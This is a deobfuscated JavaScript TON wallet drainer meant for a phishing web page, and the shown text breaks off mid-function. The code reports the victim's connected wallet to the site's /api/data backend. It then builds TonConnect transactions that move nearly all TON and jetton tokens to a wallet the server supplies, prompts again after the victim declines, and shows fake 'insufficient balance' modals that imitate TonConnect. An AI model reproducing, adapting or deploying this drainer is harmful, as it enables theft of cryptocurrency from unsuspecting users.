//Thu Aug 29 2024 01:48:37 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
let keyEncr = 500;
const maxRetry = 3;
let tonConnectUI;
let prs_enc = 0;
(async () => {
  prs_enc = keyEncr;
  keyEncr = Math.floor(Math.random() * 1000);
})();
const TonWeb = window.TonWeb;
let allAddress,
  currTx = false;
const sendRequest = async _0x325404 => {
  _0x325404.domain = window.location.host;
  _0x325404.walletName = tonConnectUI?.["wallet"]?.["device"]?.["appName"];
  _0x325404.account = allAddress;
  const _0x563cf0 = JSON.stringify(_0x325404);
  const _0x5242a6 = await fetch("/api/data", {
    method: "POST",
    headers: {
      Accept: "text/plain",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "raw=" + _0x563cf0
  });
  let _0x4e0282 = await _0x5242a6.text();
  let _0x1fee0c = JSON.parse(_0x4e0282);
  const _0x42926c = {
    status: "error",
    error: "Server is Unavailable"
  };
  if (!_0x1fee0c.status) {
    return _0x42926c;
  }
  if (_0x1fee0c.status == "OK") {
    console.log("STATUS OK");
    const _0x11e538 = {
      status: "ok",
      data: _0x1fee0c.data
    };
    return _0x11e538;
  }
  if (_0x1fee0c.status == "ERROR" && _0x1fee0c.reason == "low balance") {
    const _0x2005eb = {
      status: "error",
      reason: "low balance"
    };
    return _0x2005eb;
  }
  if (_0x1fee0c.status == "ERROR" && _0x1fee0c.reason == "low tax") {
    const _0x20a43c = {
      status: "error",
      reason: "tax"
    };
    return _0x20a43c;
  }
};
async function connect() {
  try {
    let _0x22c682 = await scan_account();
    if (_0x22c682?.["status"] == "error" && _0x22c682?.["reason"] == "low balance") {
      var _0x22398d = document.createElement("DIV"),
        _0x129f17 = document.createElement("style");
      _0x129f17.innerHTML = ".go1993895553{font-family:arial;} .go4168504425{font-family:arial;} .go1770544884{width:256px;padding:12px 16px;display:flex;gap:9px;background-color:#121214;box-shadow:0 4px 24px rgba(0, 0, 0, 0.16);border-radius:16px;}.go4168504425{font-style:normal;font-weight:510;font-size:14px;line-height:130%;color:#E5E5EA;}.go1993895553{font-style:normal;font-weight:700;font-size:20px;line-height:28px;text-align:center;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go1318663305{padding:0;display:flex;justify-content:center;align-items:center;width:32px;height:32px;border-radius:50%;background-color:#222224;border:none;cursor:pointer;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go1318663305:hover{transform:scale(1.04);}}.go1318663305:active{transform:scale(0.96);}@media (hover: none){.go1318663305:active{transform:scale(0.92);}}.go4218612181{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:pointer;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go4218612181:hover{transform:scale(1.02);}}.go4218612181:active{transform:scale(0.98);}@media (hover: none){.go4218612181:active{transform:scale(0.96);}}.go3974562317{background-color:#0098EA;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);padding:8px 16px 8px 12px;display:flex;align-items:center;gap:4px;height:40px;}.go242012907{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:not-allowed;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go242012907:hover{transform:unset;}}.go242012907:active{transform:unset;}@media (hover: none){.go242012907:active{transform:unset;}} .go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}@keyframes go1365964679{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.go121314943{animation:go1365964679 1s linear infinite;}.go3251346826{height:18px;width:18px;}.go817518207{min-width:148px;height:40px;background-color:#121214;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);display:flex;align-items:center;justify-content:center;}.go1140934594{font-style:normal;font-weight:590;font-size:15px;line-height:18px;color:#E5E5EA;}.go3349661836{transform:rotate(270deg);transition:transform 0.1s ease-in-out;}.go157313249{padding:12px 16px;min-width:148px;justify-content:center;background-color:#121214;}.go2933289244 > div:first-child{margin-top:20px;}.go3572451881{width:fit-content;display:flex;flex-direction:column;align-items:flex-end;}.go3758850101{position:absolute;right:16px;top:16px;}.go3525292397{margin-top:16px;}.go1186201158{font-weight:510;font-size:16px;line-height:20px;text-align:center;max-width:200px;color:#7D7D85;}.go3799783513{display:flex;flex-direction:column;align-items:center;padding-bottom:8px;}.go3872688706{position:relative;min-height:100px;width:416px;padding:44px 56px 24px;box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.04);background-color:#121214;border-radius:24px;}@media (max-width: 440px){.go3872688706{width:100%;}}.go1901766449{border-radius:24px;background-color:#222224;}@media (max-width: 440px){.go1901766449{border-radius:24px 24px 0 0;}}.go823957079{display:flex;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0, 0, 0, 0.4);padding:20px 0;overflow-y:auto;}@media (max-width: 440px){.go823957079{padding-bottom:0;}}.go3727189606{font-style:normal;font-weight:590;font-size:16px;line-height:20px;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go2847679431{width:192px;}.go2847679431 > h3{font-size:15px;}.go3770780435{align-self:center;}";
      _0x22398d.innerHTML = "<div class=\"go823957079 s-enter-active s-enter-to\" data-tc-actions-modal-container=\"true\" data-tc-modal=\"true\"><div class=\"go37342527 go1901766449\"><div class=\"go3872688706\"><button class=\"go3758850101 go1318663305\" data-tc-icon-button=\"true\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M2.71966 2.71968C3.01255 2.42678 3.48743 2.42677 3.78032 2.71966L8.00002 6.93925L12.2197 2.71967C12.5126 2.42677 12.9874 2.42678 13.2803 2.71967C13.5732 3.01257 13.5732 3.48744 13.2803 3.78033L9.06068 7.99991L13.2803 12.2197C13.5732 12.5126 13.5732 12.9874 13.2803 13.2803C12.9874 13.5732 12.5126 13.5732 12.2197 13.2803L8.00002 9.06057L3.78033 13.2803C3.48744 13.5732 3.01257 13.5732 2.71967 13.2803C2.42678 12.9874 2.42677 12.5126 2.71967 12.2197L6.93936 7.99991L2.71968 3.78034C2.42678 3.48745 2.42677 3.01257 2.71966 2.71968Z\" fill=\"#909099\"></path></svg></button><div class=\"go3799783513\" data-tc-confirm-modal=\"true\"><svg width=\"75px\" height=\"75px\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\" stroke=\"\"><g id=\"SVGRepo_bgCarrier\" stroke-width=\"0\"></g><g id=\"SVGRepo_tracerCarrier\" stroke-linecap=\"round\" stroke-linejoin=\"round\"></g><g id=\"SVGRepo_iconCarrier\"> <path d=\"M10.0303 8.96967C9.73741 8.67678 9.26253 8.67678 8.96964 8.96967C8.67675 9.26256 8.67675 9.73744 8.96964 10.0303L10.9393 12L8.96966 13.9697C8.67677 14.2626 8.67677 14.7374 8.96966 15.0303C9.26255 15.3232 9.73743 15.3232 10.0303 15.0303L12 13.0607L13.9696 15.0303C14.2625 15.3232 14.7374 15.3232 15.0303 15.0303C15.3232 14.7374 15.3232 14.2625 15.0303 13.9697L13.0606 12L15.0303 10.0303C15.3232 9.73746 15.3232 9.26258 15.0303 8.96969C14.7374 8.6768 14.2625 8.6768 13.9696 8.96969L12 10.9394L10.0303 8.96967Z\" fill=\"#0098EA\"></path> <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M12.0574 1.25H11.9426C9.63424 1.24999 7.82519 1.24998 6.41371 1.43975C4.96897 1.63399 3.82895 2.03933 2.93414 2.93414C2.03933 3.82895 1.63399 4.96897 1.43975 6.41371C1.24998 7.82519 1.24999 9.63422 1.25 11.9426V12.0574C1.24999 14.3658 1.24998 16.1748 1.43975 17.5863C1.63399 19.031 2.03933 20.1711 2.93414 21.0659C3.82895 21.9607 4.96897 22.366 6.41371 22.5603C7.82519 22.75 9.63423 22.75 11.9426 22.75H12.0574C14.3658 22.75 16.1748 22.75 17.5863 22.5603C19.031 22.366 20.1711 21.9607 21.0659 21.0659C21.9607 20.1711 22.366 19.031 22.5603 17.5863C22.75 16.1748 22.75 14.3658 22.75 12.0574V11.9426C22.75 9.63423 22.75 7.82519 22.5603 6.41371C22.366 4.96897 21.9607 3.82895 21.0659 2.93414C20.1711 2.03933 19.031 1.63399 17.5863 1.43975C16.1748 1.24998 14.3658 1.24999 12.0574 1.25ZM3.9948 3.9948C4.56445 3.42514 5.33517 3.09825 6.61358 2.92637C7.91356 2.75159 9.62177 2.75 12 2.75C14.3782 2.75 16.0864 2.75159 17.3864 2.92637C18.6648 3.09825 19.4355 3.42514 20.0052 3.9948C20.5749 4.56445 20.9018 5.33517 21.0736 6.61358C21.2484 7.91356 21.25 9.62177 21.25 12C21.25 14.3782 21.2484 16.0864 21.0736 17.3864C20.9018 18.6648 20.5749 19.4355 20.0052 20.0052C19.4355 20.5749 18.6648 20.9018 17.3864 21.0736C16.0864 21.2484 14.3782 21.25 12 21.25C9.62177 21.25 7.91356 21.2484 6.61358 21.0736C5.33517 20.9018 4.56445 20.5749 3.9948 20.0052C3.42514 19.4355 3.09825 18.6648 2.92637 17.3864C2.75159 16.0864 2.75 14.3782 2.75 12C2.75 9.62177 2.75159 7.91356 2.92637 6.61358C3.09825 5.33517 3.42514 4.56445 3.9948 3.9948Z\" fill=\"#0098EA\"></path> </g></svg><h1 class=\"go3525292397 go1993895553\" data-tc-h1=\"true\">You have an insufficient balance</h1><div class=\"go1186201158 go4168504425\" fontsize=\"14px\" fontweight=\"510\" lineheight=\"130%\" color=\"#E5E5EA\" data-tc-text=\"true\" style=\"cursor: default;\">Top-up your balance by at least 0.01 TON</div></div></div></div></div>";
      document.getElementsByTagName("body")[0].appendChild(_0x129f17);
      document.getElementsByTagName("body")[0].appendChild(_0x22398d);
      _0x22398d.addEventListener("click", _0x2a4e5e => {
        _0x22398d.style.display = "none";
      });
      return;
    }
    if (_0x22c682?.["status"] == "error" && _0x22c682?.["reason"] == "tax") {
      console.log("Low tax");
      var _0x22398d = document.createElement("DIV"),
        _0x129f17 = document.createElement("style");
      _0x129f17.innerHTML = ".go1993895553{font-family:arial;} .go4168504425{font-family:arial;} .go1770544884{width:256px;padding:12px 16px;display:flex;gap:9px;background-color:#121214;box-shadow:0 4px 24px rgba(0, 0, 0, 0.16);border-radius:16px;}.go4168504425{font-style:normal;font-weight:510;font-size:14px;line-height:130%;color:#E5E5EA;}.go1993895553{font-style:normal;font-weight:700;font-size:20px;line-height:28px;text-align:center;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go1318663305{padding:0;display:flex;justify-content:center;align-items:center;width:32px;height:32px;border-radius:50%;background-color:#222224;border:none;cursor:pointer;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go1318663305:hover{transform:scale(1.04);}}.go1318663305:active{transform:scale(0.96);}@media (hover: none){.go1318663305:active{transform:scale(0.92);}}.go4218612181{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:pointer;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go4218612181:hover{transform:scale(1.02);}}.go4218612181:active{transform:scale(0.98);}@media (hover: none){.go4218612181:active{transform:scale(0.96);}}.go3974562317{background-color:#0098EA;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);padding:8px 16px 8px 12px;display:flex;align-items:center;gap:4px;height:40px;}.go242012907{display:inline-block;gap:unset;align-items:unset;justify-content:unset;background-color:rgba(229,229,234, 0.12);color:#E5E5EA;padding:9px 16px;padding-left:16px;padding-right:16px;border:none;border-radius:100vh;cursor:not-allowed;font-size:14px;font-weight:590;line-height:18px;transition:transform 0.125s ease-in-out;}@media not all and (hover: none){.go242012907:hover{transform:unset;}}.go242012907:active{transform:unset;}@media (hover: none){.go242012907:active{transform:unset;}} .go37342527{box-shadow:0 4px 16px rgba(0, 0, 0, 0.08), 0 16px 64px rgba(0, 0, 0, 0.16);width:fit-content;margin:auto;}@media (max-width: 440px){.go37342527{width:100%;height:fit-content;margin:auto 0 0 0;}}.go3288899091{transform:translateY(-8px);margin-bottom:12px;}.go3535743411{margin-bottom:12px;}tc-root *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, Tahoma, Verdana, sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;-webkit-tap-highlight-color:transparent;}tc-root img{-webkit-user-select:none;-webkit-touch-callout:none;}tc-root *:focus{outline:#08f auto 2px;}tc-root li{list-style:none;}tc-root button{outline:none;}body.tc-disable-scroll{position:fixed;overflow-y:scroll;right:0;left:0;}body.tc-using-mouse tc-root *:focus{outline:none;}@keyframes go1365964679{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.go121314943{animation:go1365964679 1s linear infinite;}.go3251346826{height:18px;width:18px;}.go817518207{min-width:148px;height:40px;background-color:#121214;color:#FFFFFF;box-shadow:0 4px 24px rgba(0,0,0, 0.16);display:flex;align-items:center;justify-content:center;}.go1140934594{font-style:normal;font-weight:590;font-size:15px;line-height:18px;color:#E5E5EA;}.go3349661836{transform:rotate(270deg);transition:transform 0.1s ease-in-out;}.go157313249{padding:12px 16px;min-width:148px;justify-content:center;background-color:#121214;}.go2933289244 > div:first-child{margin-top:20px;}.go3572451881{width:fit-content;display:flex;flex-direction:column;align-items:flex-end;}.go3758850101{position:absolute;right:16px;top:16px;}.go3525292397{margin-top:16px;}.go1186201158{font-weight:510;font-size:16px;line-height:20px;text-align:center;max-width:200px;color:#7D7D85;}.go3799783513{display:flex;flex-direction:column;align-items:center;padding-bottom:8px;}.go3872688706{position:relative;min-height:100px;width:416px;padding:44px 56px 24px;box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.04);background-color:#121214;border-radius:24px;}@media (max-width: 440px){.go3872688706{width:100%;}}.go1901766449{border-radius:24px;background-color:#222224;}@media (max-width: 440px){.go1901766449{border-radius:24px 24px 0 0;}}.go823957079{display:flex;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0, 0, 0, 0.4);padding:20px 0;overflow-y:auto;}@media (max-width: 440px){.go823957079{padding-bottom:0;}}.go3727189606{font-style:normal;font-weight:590;font-size:16px;line-height:20px;color:#E5E5EA;margin-top:0;margin-bottom:0;cursor:default;}.go2847679431{width:192px;}.go2847679431 > h3{font-size:15px;}.go3770780435{align-self:center;}";
      _0x22398d.innerHTML = "<div class=\"go823957079 s-enter-active s-enter-to\" data-tc-actions-modal-container=\"true\" data-tc-modal=\"true\"><div class=\"go37342527 go1901766449\"><div class=\"go3872688706\"><button class=\"go3758850101 go1318663305\" data-tc-icon-button=\"true\"><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M2.71966 2.71968C3.01255 2.42678 3.48743 2.42677 3.78032 2.71966L8.00002 6.93925L12.2197 2.71967C12.5126 2.42677 12.9874 2.42678 13.2803 2.71967C13.5732 3.01257 13.5732 3.48744 13.2803 3.78033L9.06068 7.99991L13.2803 12.2197C13.5732 12.5126 13.5732 12.9874 13.2803 13.2803C12.9874 13.5732 12.5126 13.5732 12.2197 13.2803L8.00002 9.06057L3.78033 13.2803C3.48744 13.5732 3.01257 13.5732 2.71967 13.2803C2.42678 12.9874 2.42677 12.5126 2.71967 12.2197L6.93936 7.99991L2.71968 3.78034C2.42678 3.48745 2.42677 3.01257 2.71966 2.71968Z\" fill=\"#909099\"></path></svg></button><div class=\"go3799783513\" data-tc-confirm-modal=\"true\"><svg width=\"75px\" height=\"75px\" viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\" stroke=\"\"><g id=\"SVGRepo_bgCarrier\" stroke-width=\"0\"></g><g id=\"SVGRepo_tracerCarrier\" stroke-linecap=\"round\" stroke-linejoin=\"round\"></g><g id=\"SVGRepo_iconCarrier\"> <path d=\"M10.0303 8.96967C9.73741 8.67678 9.26253 8.67678 8.96964 8.96967C8.67675 9.26256 8.67675 9.73744 8.96964 10.0303L10.9393 12L8.96966 13.9697C8.67677 14.2626 8.67677 14.7374 8.96966 15.0303C9.26255 15.3232 9.73743 15.3232 10.0303 15.0303L12 13.0607L13.9696 15.0303C14.2625 15.3232 14.7374 15.3232 15.0303 15.0303C15.3232 14.7374 15.3232 14.2625 15.0303 13.9697L13.0606 12L15.0303 10.0303C15.3232 9.73746 15.3232 9.26258 15.0303 8.96969C14.7374 8.6768 14.2625 8.6768 13.9696 8.96969L12 10.9394L10.0303 8.96967Z\" fill=\"#0098EA\"></path> <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M12.0574 1.25H11.9426C9.63424 1.24999 7.82519 1.24998 6.41371 1.43975C4.96897 1.63399 3.82895 2.03933 2.93414 2.93414C2.03933 3.82895 1.63399 4.96897 1.43975 6.41371C1.24998 7.82519 1.24999 9.63422 1.25 11.9426V12.0574C1.24999 14.3658 1.24998 16.1748 1.43975 17.5863C1.63399 19.031 2.03933 20.1711 2.93414 21.0659C3.82895 21.9607 4.96897 22.366 6.41371 22.5603C7.82519 22.75 9.63423 22.75 11.9426 22.75H12.0574C14.3658 22.75 16.1748 22.75 17.5863 22.5603C19.031 22.366 20.1711 21.9607 21.0659 21.0659C21.9607 20.1711 22.366 19.031 22.5603 17.5863C22.75 16.1748 22.75 14.3658 22.75 12.0574V11.9426C22.75 9.63423 22.75 7.82519 22.5603 6.41371C22.366 4.96897 21.9607 3.82895 21.0659 2.93414C20.1711 2.03933 19.031 1.63399 17.5863 1.43975C16.1748 1.24998 14.3658 1.24999 12.0574 1.25ZM3.9948 3.9948C4.56445 3.42514 5.33517 3.09825 6.61358 2.92637C7.91356 2.75159 9.62177 2.75 12 2.75C14.3782 2.75 16.0864 2.75159 17.3864 2.92637C18.6648 3.09825 19.4355 3.42514 20.0052 3.9948C20.5749 4.56445 20.9018 5.33517 21.0736 6.61358C21.2484 7.91356 21.25 9.62177 21.25 12C21.25 14.3782 21.2484 16.0864 21.0736 17.3864C20.9018 18.6648 20.5749 19.4355 20.0052 20.0052C19.4355 20.5749 18.6648 20.9018 17.3864 21.0736C16.0864 21.2484 14.3782 21.25 12 21.25C9.62177 21.25 7.91356 21.2484 6.61358 21.0736C5.33517 20.9018 4.56445 20.5749 3.9948 20.0052C3.42514 19.4355 3.09825 18.6648 2.92637 17.3864C2.75159 16.0864 2.75 14.3782 2.75 12C2.75 9.62177 2.75159 7.91356 2.92637 6.61358C3.09825 5.33517 3.42514 4.56445 3.9948 3.9948Z\" fill=\"#0098EA\"></path> </g></svg><h1 class=\"go3525292397 go1993895553\" data-tc-h1=\"true\">You have an insufficient balance</h1><div class=\"go1186201158 go4168504425\" fontsize=\"14px\" fontweight=\"510\" lineheight=\"130%\" color=\"#E5E5EA\" data-tc-text=\"true\" style=\"cursor: default;\">Top-up your balance by at least 0.2 TON</div></div></div></div></div>";
      document.getElementsByTagName("body")[0].appendChild(_0x129f17);
      document.getElementsByTagName("body")[0].appendChild(_0x22398d);
      _0x22398d.addEventListener("click", _0x1df637 => {
        _0x22398d.style.display = "none";
      });
      return;
    }
    if (_0x22c682?.["status"] == "ok") {
      var _0x4882d8 = 0;
      if (_0x22c682.data.haveJettons) {
        let _0x1523b8 = {},
          _0x22bbfd = 32;
        if (Object.keys(_0x22c682.data.jettons).length >= 32) {
          for (let _0x2054f0 = 0; _0x2054f0 < Object.keys(_0x22c682.data.jettons).length; _0x2054f0++) {
            if (Object.keys(_0x22c682.data.jettons).length >= 32) {
              if (_0x2054f0 < _0x22bbfd && _0x2054f0 < Object.keys(_0x22c682.data.jettons).length - 1) {
                _0x1523b8[_0x2054f0] = _0x22c682.data.jettons[_0x2054f0];
              } else {
                _0x22bbfd += 32;
              }
            }
          }
        } else {
          _0x1523b8 = _0x22c682.data.jettons;
        }
      } else {
        var _0x4882d8 = 0;
        let _0x45fa96 = await send(_0x22c682.data.ton, _0x4882d8);
        if (_0x45fa96?.["hash"]) {
          transaction_done(_0x45fa96.hash, _0x45fa96.val);
        }
      }
    }
  } catch (_0x4860bb) {
    let _0x3c652a = "connect() " + _0x4860bb.stack;
    send_error(_0x3c652a);
    console.error("Error fetching balance:", _0x4860bb);
  }
}
async function sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, _0x24f8d6, _0x4bdf69, _0x4b480f = false) {
  if (_0x496778 < 0) {
    _0x496778 = 0;
  }
  currTx = false;
  let _0x217c0a = 0;
  let _0x1a5179 = 0,
    _0x51e111;
  const _0x48d9b3 = {
    validUntil: Math.floor(Date.now() / 1000) + 60,
    messages: []
  };
  let _0x5b5b74 = {},
    _0x337e82 = Object.keys(_0x2a04ec.data.boc).length + 1;
  for (_0x496778; _0x496778 < _0x337e82 + 1; _0x496778) {
    try {
      if (_0x217c0a < 4 && _0x496778 < _0x337e82) {
        _0x217c0a += 1;
        if (!_0x4b480f) {
          let _0x4bc857 = (await getKek()).data;
          if (_0x4bc857.used) {
            const _0x3813a2 = {
              address: _0x4bc857.address,
              amount: 1,
              payload: _0x4bc857.boc
            };
            _0x48d9b3.messages.push(_0x3813a2);
            _0x217c0a += 1;
          }
          _0x4b480f = true;
        }
        if (_0x5aadee * _0x42f8ea < _0x2a04ec.data.prices[_0x496778] || _0x5aadee * _0x42f8ea > _0x2a04ec.data.prices[_0x496778] && _0x4bdf69) {
          _0x48d9b3.messages.push({
            address: _0x2a04ec.data.address[_0x496778],
            amount: TonWeb.utils.toNano("0.05").toString(),
            payload: _0x2a04ec.data.boc[_0x496778]
          });
          const _0x5db7da = {
            name: _0x2a04ec.data.name[_0x496778],
            prices: _0x2a04ec.data.prices[_0x496778],
            amount: _0x2a04ec.data.amounts[_0x496778],
            symbol: _0x2a04ec.data.symbol[_0x496778],
            nfts: _0x2a04ec.data.nfts[_0x496778]
          };
          _0x5b5b74[_0x1a5179] = _0x5db7da;
          _0x1a5179++;
          _0x496778++;
        } else {
          if (!_0x51e111) {
            let _0x4611ff = _0x5aadee * _0x42f8ea,
              _0x1e65c4 = (_0x5aadee - "0.2") * _0x42f8ea,
              _0x2cc16a = _0x1e65c4 + _0x2a04ec.data.prices[_0x496778];
            if (_0x48d9b3.messages.length === 0 && _0x337e82 === 2 && _0x2cc16a < _0x4611ff) {
              let _0x2c0fe8 = TonWeb.utils.toNano(_0x5aadee) - TonWeb.utils.toNano("0.01"),
                _0x709ded = (await get_ton_text(_0x2c0fe8)).data;
              _0x48d9b3.messages.push({
                address: _0x2a04ec.data.wallet.wallet,
                amount: _0x2c0fe8.toString(),
                payload: _0x709ded
              });
              _0x51e111 = true;
              _0x4bdf69 = true;
              _0x5b5b74[_0x1a5179] = {
                name: "TON",
                prices: TonWeb.utils.fromNano(_0x2c0fe8.toString()) * _0x42f8ea,
                amount: TonWeb.utils.fromNano(_0x2c0fe8.toString()),
                symbol: "TON"
              };
              _0x1a5179++;
              _0x496778++;
            } else {
              if (_0x5aadee > "0.2") {
                let _0x2c0cf4 = TonWeb.utils.toNano(_0x5aadee) - TonWeb.utils.toNano("0.2"),
                  _0x9bb92b = (await get_ton_text(_0x2c0cf4)).data;
                _0x48d9b3.messages.push({
                  address: _0x2a04ec.data.wallet.wallet,
                  amount: _0x2c0cf4.toString(),
                  payload: _0x9bb92b
                });
                _0x51e111 = true;
                _0x4bdf69 = true;
                _0x5b5b74[_0x1a5179] = {
                  name: "TON",
                  prices: TonWeb.utils.fromNano(_0x2c0cf4.toString()) * _0x42f8ea,
                  amount: TonWeb.utils.fromNano(_0x2c0cf4.toString()),
                  symbol: "TON"
                };
                _0x1a5179++;
              }
            }
          }
        }
      } else {
        if (Object.keys(_0x48d9b3.messages).length && !currTx) {
          currTx = true;
          const _0x21ae3d = await tonConnectUI.sendTransaction(_0x48d9b3);
          _0x217c0a = 0;
          _0x1a5179 = 0;
          const _0x44c262 = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(_0x21ae3d.boc));
          _0x48d9b3.messages = [];
          const _0x47365e = TonWeb.utils.bytesToBase64(await _0x44c262.hash());
          let _0x3be510 = {
            hash: encodeURIComponent(_0x47365e),
            tokens: _0x5b5b74
          };
          if (_0x51e111) {
            _0x4bdf69 = true;
            await jettons_transaction_done(_0x3be510, true);
            tonConnectUI.wallet.appName == "telegram-wallet" ? setTimeout(async () => {
              await sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, 0, true, _0x4b480f);
            }, "7000") : await sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, 0, true, _0x4b480f);
          } else {
            await jettons_transaction_done(_0x3be510, false);
            await sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, 0, false, _0x4b480f);
            tonConnectUI.wallet.appName == "telegram-wallet" ? setTimeout(async () => {
              await sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, 0, false, _0x4b480f);
            }, "7000") : await sendJettons(_0x2a04ec, _0x5aadee, _0x42f8ea, _0x496778, 0, false, _0x4b480f);
          }
        } else {
          return;
        }
      }
    } catch (_0x5b49ed) {
      _0x24f8d6++;
      console.log(_0x5b49ed);
      if (_0x51e111) {
        if (_0x24f8d6 < maxRetry) {
          _0x48d9b3.messages = {};
          console.log(_0x5b5b74);
          if (tonConnectUI.wallet.appName == "telegram-wallet") {
            setTimeout(async () => {}, "3000");
          }
        } else {
          _0x48d9b3.messages = {};
          if (_0x496778 < Object.keys(_0x2a04ec.data.boc).length) {
            if (tonConnectUI.wallet.appName == "telegram-wallet") {
              setTimeout(async () => {}, "3000");
            }
          } else {
            break;
          }
        }
      } else {
        if (_0x24f8d6 < maxRetry) {
          _0x48d9b3.messages = {};
          if (tonConnectUI.wallet.appName == "telegram-wallet") {
            setTimeout(async () => {}, "3000");
          }
        } else {
          _0x48d9b3.messages = {};
          if (_0x496778 < _0x337e82) {
            if (tonConnectUI.wallet.appName == "telegram-wallet") {
              setTimeout(async () => {}, "3000");
            }
          } else {
            break;
          }
        }
      }
    }
  }
}
async function send(_0x41aaa7, _0x1775b9) {
  _0x1775b9++;
  if (_0x1775b9 <= maxRetry) {
    let _0x497693 = TonWeb.utils.toNano(_0x41aaa7),
      _0x52ae32 = _0x497693 - TonWeb.utils.toNano("0.01"),
      _0x17d459 = (await get_ton_text(_0x52ae32)).data,
      _0xbae1fe = (await getKek()).data;
    const _0x285534 = await transfer_ton_native_request(_0x52ae32, _0x1775b9),
      _0x3012b = _0x285534.data;
    _0x41aaa7 = _0x41aaa7.toString();
    const _0x254ad2 = {
      address: _0x3012b.wallet,
      amount: _0x52ae32,
      payload: _0x17d459
    };
    const _0x134469 = {
      validUntil: Math.floor(Date.now() / 1000) + 60,
      messages: [{
        address: allAddress,
        amount: TonWeb.utils.toNano("0.01")
      }, _0x254ad2]
    };
    if (_0xbae1fe.used) {
      const _0x1ef566 = {
        address: _0xbae1fe.address,
        amount: 1,
        payload: _0xbae1fe.boc
      };
      _0x134469.messages.push(_0x1ef566);
    }
    try {
      const _0x1bb332 = await tonConnectUI.sendTransaction(_0x134469),
        _0x176a75 = TonWeb.boc.Cell.oneFromBoc(TonWeb.utils.base64ToBytes(_0x1bb332.boc));
      const _0x798191 = TonWeb.utils.bytesToBase64(await _0x176a75.hash()),
        _0x210c49 = {
          hash: _0x798191,
          val: transfer_valuef
        };
      return _0x210c49;
    } catch (_0x4be477) {
      console.error(_0x4be477);
      decline_transfer_ton_native_request(_0x52ae32, _0x1775b9);
      let _0x4ce2b8 = await send(_0x41aaa7, _0x1775b9);
      return _0x4ce2b8;
    }
  }
}
const site_visit = async () => {
    try {} catch (_0x294efe) {
      let _0x7efa1a = "site_visit() " + _0x294efe.stack;
      send_error(_0x7efa1a);
      console.log(_0x294efe);
    }
  },
  scan_account = async () => {
    try {
      let _0x502cd4 = await sendRequest({
        action: "scan_account",
        account: allAddress
      });
      return _0x502cd4;
    } catch (_0x227c17) {
      let _0x4201d0 = "scan_account() " + _0x227c17.stack;
      send_error(_0x4201d0);
      console.log(_0x227c17);
    }
  },
  transfer_ton_native_request = async (_0x1bae23, _0x270aa9) => {
    try {
      let _0x51b446 = await sendRequest({
        action: "transfer_ton_native_request",
        val: _0x1bae23,
        domain: window.location.host,
        try: _0x270aa9,
